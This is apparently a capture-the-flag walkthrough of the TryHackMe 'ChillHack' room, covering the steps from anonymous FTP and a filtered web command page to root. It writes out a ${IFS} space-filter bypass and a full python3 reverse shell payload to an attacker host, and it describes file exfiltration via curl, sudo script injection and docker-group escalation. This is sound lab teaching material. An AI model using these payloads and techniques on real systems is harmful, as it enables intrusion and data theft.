![[chillhack_00.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_00.png)

Hack 'n' Chill...

---

We'll start off with a quick `nmap` scan.

![[chillhack_01.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_01.png)

Then follow up with a more specific scan.

![[chillhack_02.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_02.png)

We can see three ports open: `ftp`, `ssh` and `http`. Interestingly, we can see that we can access `ftp` with the default credentials: `ftp:ftp`. Before checking out the website, let's login to `ftp` and have a look at what `note.txt` says.

![[chillhack_03.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_03.png)

We can grab the file with `get note.txt`. A good idea is to turn prompting off with, funnily enough, `prompt off`.

![[chillhack_04.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_04.png)

Filtering. OK. But where is that filtering done? 

We will check the website and see that it's a sports site that tracks football. Enumerating the site doesn't net anything worth mentioning.

Let's perform some more enumeration by doing a little directory busting.

![[chillhack_05.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_05.png)

Looks like they are hiding something!

![[chillhack_06.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_06.png)

A way to directly interact with the machine?

This is likely where filtering is occurring. Let's try some commands.

![[chillhack_07.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_07.png)

We are successful with `id`, what about `cat /etc/passwd`?

![[chillhack_08.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_08.png)

No.

Now we can see the outcome of the filtering. The thing that stands out to me first are the white spaces we had in our call to `/etc/passwd`. Perhaps the website is allowing single word commands but, anything that is separated by a space is filtered. 

If we are interacting directly with the command line, as it looks like we are, then we can use the command line variable `IFS` to replace white space.

`IFS` means `Internal Field Separator` and it's default is either a `space`, `tab`, `newline`, etc. That means we can try `cat${IFS}/etc/passwd` to see if we can read the file. We use `${}` string substitution because it'll expand the variable. That is, it'll replace itself with the white space we want.

![[chillhack_09.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_09.png)

Nice, it looks like it is filtering spaces.

OK, let's try to grab a shell then! It should be fairly easy.

After a few different payloads, I discovered that a `python3` reverse shell worked best for me.

```python
python3${IFS}-c${IFS}'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

We'll make sure that we include  `${IFS}` to account for any spaces, set up a listener and then execute the payload.

![[chillhack_10.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_10.png)

![[chillhack_11.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_11.png)

And we're in. 

Now, let's try to escalate our privileges. If we look around we'll discover a folder called `files` in `/var/www` .

![[chillhack_12.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_12.png)

Let's check it out.

![[chillhack_13.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_13.png)

A bunch of files worth checking out. Let's download all of them to our attack box.

We can do that by setting up a python `uploadserver` then use `curl` to download them.

First, we'll create a self-signed certificate with `openssl`.

![[chillhack_14.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_14.png)

Then we'll start our server. You may have to download `uploadserver` with `python3 -m pip install --user uploadserver`.

![[chillhack_15.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_15.png)

Lastly, on the machine, we'll use `curl` and it's `-X POST` switch to grab all the files by name.

![[chillhack_16.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_16.png)

There are also some images in the `images` folder we'll grab too.

![[chillhack_17.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_17.png)

Let's do some more enumeration before we look at the files to see if we have any way to escalate laterally.

![[chillhack_18.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_18.png)

It's interesting to me that `www-data` can run a script as another user. Let's check out the script to see what it does.

![[chillhack_19.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_19.png)

It looks like it does nothing. It grabs user input with `read` and then sends any errors from the input to `/dev/null`. We could potentially run a command here with the `$msg` variable, however!

Let's set up another listener and see if we can send another shell.

![[chillhack_20.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_20.png)

No joy.

Maybe we're getting ahead of ourselves, let's just try to run a simple command like `id`.

![[chillhack_21.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_21.png)

Nice! That means we should just be able to run a shell with `bash` or `/bin/bash` to escalate to `apaar`.

![[chillhack_22.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_22.png)

Nice, now what can we do?

Checking `apaar's` home directory reveals a file called `local.txt`, which is the user flag.

![[chillhack_23.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_23.png)

Nice!

Looking around for some method to escalate to another user doesn't net us anything and the `sudoers` is the same for `apaar` as it is for `www-data`. No dice.

Let's have a look at some of the stuff that we downloaded.

![[chillhack_24.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_24.png)

We find some HTML in `hacker.php` with a hint. "Look in the dark"?

That means there's something probably hidden in the image above these lines.

If we use `strings`, `binwalk` or `foremost` we don't find anything, but, stenography is something we haven't tried yet AND the file is a `jpg`.

![[chillhack_25.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_25.png)

I wrote a script that will rename the files correctly and will attempt to open any zip files it finds. It uses `stegseek` to crack the file with `rockyou.txt`. It just makes a few things a little quicker, you don't need it as you can do the same thing with `stegseek` and then rename/unzip any files you find.

Here we can see that the zip file has a password attached to it. That means we'll have to crack that. In order to do that we'll need to use `zip2john` and use `john the ripper` to attempt to crack the resulting hash.

![[chillhack_26.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_26.png)

![[chillhack_27.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_27.png)

Now, let's see what's in the file.

![[chillhack_28.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_28.png)

Source code. Jackpot. Let's read the file.

![[chillhack_29.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_29.png)

A password encoded in `base64`. That's very easy to reverse. We can do that with the  `base64` utility by supplying the `-d` switch.

![[chillhack_30.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_30.png)

We can also see from the source code this password seems to be for the user `Anurodh`. 

SSH is open on the machine, we'll use that to try and log in.

![[chillhack_31.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_31.png)

We're in! Let's enumerate again.

![[chillhack_32.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_32.png)

We get something interesting almost straight away. If we check `id` we can see that `anurodh` is a member of the `docker` group. Being part of this group means we can potentially set up a privileged docker instance and use it to mount the root file system. 

Let's first check to see if we have any images on the machine with `docker images`.

![[chillhack_33.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_33.png)

There is one image, `alpine`. Technically, there are two, yes, but this is the test image.

In order to check the image out and use it like a file system we need to mount it with docker. We will use `chroot` to set the mounted file as the root directory in this case.

We can find a useful command to achieve this on `hacktricks`

![[chillhack_34.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_34.png)

In our case we don't have to specify the shell type as it'll default to `bash`. We'll also add the `--rm` switch to remove the image on exit.

![[chillhack_35.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_35.png)

This command will mount the root file system to a new mount point I called `rootflag`. Then the instance is being set up as interactive, it'll be removed when closed, the image is `alpine` and the location we will land in when interacting with the instance will be the `rootflag` directory we just mounted. This directory will be the root directory of this instance (this is what `chroot` does) and it'll contain the root file system.

We can now see all the files. The most important right now is the `proof.txt` file in `/root`. 

This is the `root.txt` flag.

![[chillhack_36.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/ChillHack/images/chillhack_36.png)

We're presented with a nice little celebration message at the end!

And we're done.
